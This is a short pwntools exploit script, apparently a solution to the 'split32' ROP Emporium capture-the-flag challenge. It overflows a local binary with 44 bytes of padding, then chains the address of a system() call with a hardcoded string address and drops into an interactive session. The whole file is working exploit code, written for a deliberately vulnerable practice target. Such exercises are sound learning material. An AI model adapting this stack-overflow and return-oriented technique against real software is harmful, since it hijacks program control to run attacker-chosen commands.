from pwn import *

proc = process("./split32")

BUF = 'A'*44

USEFUL_STR = 0x0804a030
SYS_CALL = 0x0804861a

payload = BUF.encode('utf-8')
payload += p32(SYS_CALL)
payload += p32(USEFUL_STR)

proc.sendline(payload)
proc.interactive()
